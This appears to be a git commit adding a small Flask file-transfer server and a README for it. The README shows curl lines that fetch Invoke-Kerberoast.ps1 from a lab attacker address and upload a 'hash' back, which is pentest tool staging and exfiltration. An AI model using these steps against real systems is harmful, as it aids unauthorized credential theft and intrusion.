f748e632546f4654b3035c0e40598b982a673d96
Elweth <antoine.ardino@gmail.com>
2021-04-17 18:59:02 +0200

    SimpleHTTPServer

---
+++ README.md
@@ -0,0 +1,15 @@
+# SimpleHTTPTransfer
+
+Just a little script to simplify the file transfer from or to a remote server.
+Add it to your PATH and just execute it in the folder where you want to download/upload files.
+
+## List
+```curl http://10.10.14.10:5000/```
+
+## Download
+
+```curl http://10.10.14.10:5000/Invoke-Kerbeoast.ps1 > Invoke-Kerberoast.ps1```
+
+## Upload
+
+```curl http://10.10.14.10:5000/ -F 'file=hash'```
---
+++ SimpleHTTPTransfer.py
@@ -0,0 +1,53 @@
+from flask import *
+import os
+import subprocess
+from werkzeug.utils import secure_filename
+from random import randint
+
+
+app = Flask(__name__)
+
+@app.route('/', methods=['GET', 'POST'])
+def index():
+	if request.method == 'GET':
+		# list files in current directory
+		p = subprocess.Popen(["ls", "-a"], stdout=subprocess.PIPE)
+		out, err = p.communicate()
+		return out
+	else:
+		# get the file uploaded
+		file = request.files['file']
+
+		print(f"[+] {request.remote_addr} try to upload {file.filename}")
+
+		if file.filename != '':
+			if os.path.exists(file.filename):
+				new_filename = file.filename + "_" + str(randint(0,999999))
+				filename = secure_filename(new_filename)
+				file.save(os.path.join(".", filename))
+
+				return f"The file already exists, is was renammed as {new_filename}"
+			else:
+				filename = secure_filename(file.filename)
+				file.save(os.path.join(".", filename))
+
+				return "File uploaded!"
+		else:
+			return "Filename can't be null"
+
+    
+
+# Download file content
+@app.route("/<filename>")
+def download(filename):
+	filename = escape(filename)
+
+	if ".." not in filename:
+		if os.path.exists(filename):
+			msg = open(filename).read()
+		else:
+			msg = f"{filename} dont exists"
+
+	return msg
+
+app.run()
